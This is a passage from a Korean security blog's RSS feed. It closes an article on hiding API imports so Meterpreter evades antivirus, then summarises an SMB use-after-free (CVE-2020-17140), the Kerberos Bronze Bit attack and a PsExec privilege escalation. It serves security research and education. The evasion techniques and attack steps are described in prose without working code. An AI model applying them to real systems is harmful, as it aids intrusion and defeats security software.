<code>LoadLibrary/GetProcAddress</code>가 필요하지 않다.</p><p>후킹을 피하기 위해 이 함수들은 재구현하는 것이 좋고 이미 그것을 할 수 있는 오픈소스 프로젝트가 있다.(<a href="https://github.com/rapid7/ReflectiveDLLInjection/">ReflectiveDllInjection</a>)</p><p>여기까지 읽었다면, translation unit의 상단에 이러한 함수들을 위한 구현을 추가하고(<code>findInjectionSpot</code> 사용) WinAPI 대신에 구현을 사용하기 위해 메소드 <code>addGetProcAddress</code>를 업데이트하면 된다는 것을 알 것이다.</p><h3 id="Error-handling"><a href="#Error-handling" class="headerlink" title="Error handling"></a>Error handling</h3><ul><li><code>LoadLibrary</code>는 성공적으로 수행되지 않을 경우 <code>NULL</code>을 반환하므로 이에 대한 검사를 추가하여 오류를 정상적으로 복구할 수 있다. 현재 상황에서 크래시가 매우 잘 날 수도 있다.</li><li><code>GetProcAddress</code>도 오류가 발생하면 <code>NULL</code>을 반환하므로 이것도 확인하는 것이 중요하다.</li></ul><h2 id="결론"><a href="#결론" class="headerlink" title="결론"></a>결론</h2><p>이 글에서 우리는 정규식을 사용하지 않고 C/C++ 코드 베이스에서 함수 호출을 정확하게 교체할 수 있는 방법을 보여줬다. 모든 것은 안티바이러스 소프트웨어가 우리가 pentest를 하는 동안 사용하는 Meterpreter나 다른 소프트웨어에 관해 행동 정보를 정적으로 수집하는 것을 막기 위해 진행되었다.</p><p>ESET Nod32에 적용된 이 작업은 모든 Meterpreter 모듈이 탐지되지 않도록 하는 주요 단계였고 더 발전된 제품에 도움이 되었다.</p><p>API imports를 숨기는 것도 하나지만 악성코드가 실행되면 보안 소프트웨어가 API 호출 모니터링에 의해 행동 정보를 수집하는 방법도 있다.</p><p>그런 관점에서 다음 글은 의심스러운 Win32 API가 직접적인 syscalls을 하도록 자동적으로 refactoring 하는 것이다. 이것은 Cylance, Traps과 Kaspersky 같은 AV의 userland hook을 통한 런타임 탐지 우회의 핵심 단계이다.</p><h2 id="출처"><a href="#출처" class="headerlink" title="출처"></a>출처</h2><p>[1] The Rootkit Arsenal, Chapter 11, p.480.</p><p>[2]<a href="https://devblogs.microsoft.com/cppblog/exploring-clang-tooling-part-2-examining-the-clang-ast-with-clang-query/">https://devblogs.microsoft.com/cppblog/exploring-clang-tooling-part-2-examining-the-clang-ast-with-clang-query/</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Translation/">Translation</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/evasion/">evasion</category>
      
      <category domain="https://hackyboiz.github.io/tags/meterpreter/">meterpreter</category>
      
      <category domain="https://hackyboiz.github.io/tags/obfuscation/">obfuscation</category>
      
      <category domain="https://hackyboiz.github.io/tags/iat/">iat</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/13/idioth/av_evasion_part2/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-17140 : SMB uaf to info disclosure</title>
      <link>https://hackyboiz.github.io/2020/12/12/fabu1ous/2020-12-12/</link>
      <guid>https://hackyboiz.github.io/2020/12/12/fabu1ous/2020-12-12/</guid>
      <pubDate>Sat, 12 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blogs.360.cn/post/CVE-2020-17140-Analysis.html&quot;&gt;W</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blogs.360.cn/post/CVE-2020-17140-Analysis.html">Windows SMB Information Disclousure Analysis</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows 7 ~ Windows 10</p><p>svr2.sys 드라이버</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>patch Tuesday(2020.12.08)에서 CVE-2020-17140가 패치되어 Write-up이 공개되었습니다. CVE-2020-17140은 <code>SMB2_SET_INFO</code> 패킷의 처리 로직에서 발생하는 use after free로 커널 메모리를 노출시키는 취약점입니다.</p><p>SMBv2 이후부터 LEASE라는 새로운 caching mechanism이 도입되었고 클라이언트는 <code>SMB2_CREATE_REQEUST_LEASE_V2</code> 패킷을 보내 공유 파일에 lease를 생성하고, <code>SMB2_SET_INFO</code> 패킷을 보내 공유 파일의 lease를 수정할 수 있습니다.</p><p>srv2.sys 드라이버는 SMB2_SET_INFO 패킷을 받으면 <code>srv2!Smb2UpdateLeaseFileName</code>를 호출해서 lease 이름을 수정하는데, new lease name이 기존의 old lease name보다 길 경우 새로운 메모리(newFileBuf)를 할당해 old lease name을 백업합니다.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( *(_BYTE *)(v6 + <span class="hljs-number">114</span>) )ExFreePoolWithTag(oldFileBuf, <span class="hljs-number">0</span>);<span class="hljs-keyword">if</span> ( v11 )memmove(newFileBuf, oldFileBuf, <span class="hljs-number">2</span>i64 * v11);</code></pre><p>old lease name을 담고 있던 oldFileBuf를 할당 해제한 후에 newFileBuf에 복사하기 때문에 use after free가 발생합니다. oldFileBuf를 해제한 후 댕글링 포인터의 상태에 따라 kernel info leak 또는 BSoD로 이어질 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/use-after-free/">use after free</category>
      
      <category domain="https://hackyboiz.github.io/tags/smb/">smb</category>
      
      <category domain="https://hackyboiz.github.io/tags/info-leak/">info leak</category>
      
      <category domain="https://hackyboiz.github.io/tags/bsod/">bsod</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/12/fabu1ous/2020-12-12/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-17049: Kerberos Bronze Bit Attack</title>
      <link>https://hackyboiz.github.io/2020/12/11/l0ch/2020-12-11/</link>
      <guid>https://hackyboiz.github.io/2020/12/11/l0ch/2020-12-11/</guid>
      <pubDate>Fri, 11 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bi</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-attack/">CVE-2020-17049: Kerberos Bronze Bit Attack – Practical Exploitation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>standard Windows versions since 2000</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Kerberos는 Windows Active Directory 도메인 내에서 사용자, 서버 및 기타 리소스를 서로 인증하는 데 사용되는 프로토콜입니다.<br>Kerberos의 기존 공격 방법인 Golden Ticket 및 Silver Ticket 공격의 변형인 Bronze Bit 공격이 공개되었습니다.</p><blockquote><p>Golden/Silver Ticket 공격<br>내부 네트워크에 침입한 이후 동일한 네트워크의 Kerberos 인증시스템을 사용하는 다른 시스템의 자격 증명을 위조하는 공격기법</p></blockquote><br><p>Bronze Bit는 Microsoft가 Kerberos 프로토콜에 추가 한 <code>S4U2self</code> 및 <code>S4U2proxy</code> 프로토콜을 악용하며 Kerberos 프로세스가 변조된 서비스 티켓을 감지할 수 없어 발생합니다. 공격을 위해서는 다음 조건이 만족되어야 합니다.</p><ol><li>해커는 내부 네트워크의 시스템 하나(Service1)를 장악해 Active Directory 내에 접근 권한이 있어야 합니다.</li><li>침입한 시스템인 Service1에 대한 암호 해시가 필요합니다.</li><li>Service1에는 다른 시스템(Service2)에 대한 제한된 신뢰 관계가 있습니다.</li></ol><p>위 조건이 만족되면 해커는 다음과 같은 공격이 가능합니다.</p><ol><li>사용자를 식별하고 티켓을 반환하는 <code>S4U2self</code> 에서 User2의 Service1 서비스 티켓을 가져옵니다. 이때 <code>force-forwardable</code> 옵션을 사용하면 반환하는 서비스 티켓이 전달 가능한 티켓으로 변환됩니다.</li><li>Service1의 해시로 티켓을 복호화하고 플래그 값의 두 번째 비트를 0→1 로 변경한 뒤 다시 암호화합니다. </li><li>조작된 티켓은 <code>S4U2proxy</code> 에서 전송되고 Service2에 대한 서비스 티켓이 User2로 반환되어 <code>User2.ccache</code>의 디스크에 기록됩니다.</li><li>해커는 Service1 유저(User1) 권한으로 Service2 유저(User2)의 Kerberos 서비스 티켓을 얻을 수 있어 User2 권한으로 Service2에 액세스가 가능합니다.</li></ol><p>이는 Golden/Silver Ticket과 유사한 공격 방법이지만 단일 비트 플립을 이용했기 때문에 Bronze Bit로 명명되었습니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/">https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/kerberos/">kerberos</category>
      
      <category domain="https://hackyboiz.github.io/tags/bronze-bit/">bronze bit</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/11/l0ch/2020-12-11/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] PsExec Local Privilege Escalation</title>
      <link>https://hackyboiz.github.io/2020/12/10/idioth/2020-12-10/</link>
      <guid>https://hackyboiz.github.io/2020/12/10/idioth/2020-12-10/</guid>
      <pubDate>Thu, 10 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://medium.com/tenable-techblog/psexec-local-privileg</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/tenable-techblog/psexec-local-privilege-escalation-2e8069adc9c8">PsExec Local Privilege Escalation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>PsExec v2.2 all the way back to v1.72 (2006)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><blockquote><p>아직 패치되지 않은 취약점입니다.</p></blockquote><p>SysInternals Suite에서 원격으로 애플리케이션을 실행할 수 있는 PsExec에서 Local Privilege Escalation 취약점이 발견됐습니다. 해당 취약점은 글을 작성한 시점의 버전인 PsExec v2.2까지 영향을 미치며 아직 패치되지 않았습니다.</p><p>PsExec 클라이언트와 원격 PSEXESVC 서비스는 named pipe를 통해 통신합니다. 그 중 <code>\\PSEXESVC</code> 파이프는 실행할 응용 프로그램, 명령줄 데이터 등 PsExec 클라이언트의 명령을 분석하여 실행하는 역할을 합니다. <code>\\PSEXESVC</code> 파이프는 Administrator만 read/write 권한을 가져 권한이 낮은 사용자가 파이프에 read\write 하는 것을 막습니다.</p><p>하지만 PSEXESVC가 <code>\\PSEXESVC</code> 파이프를 생성할 때 파이프가 이미 존재할 경우 해당 <code>\\PSEXESVC</code> 파이프의 handle을 가져옵니다. 따라서 낮은 권한의 애플리케이션이 PSEXESVC가 실행되기 전에 <code>\\PSEXESVC</code> 파이프를 생성하면 PSEXESVC는 자신이 생성한 파이프가 아닌 이미 존재하는 파이프의 handle을 가져옵니다. PSEXESVC가 낮은 권한으로 생성된 <code>\\PSEXESVC</code> 파이프의 handle을 가져오면 PSEXESVC을 통해 SYSTEM 권한으로 명령, 응용 프로그램 실행이 가능합니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/named-pipe/">named pipe</category>
      
      <category domain="https://hackyboiz.github.io/tags/psexec/">psexec</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/10/idioth/2020-12-10/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
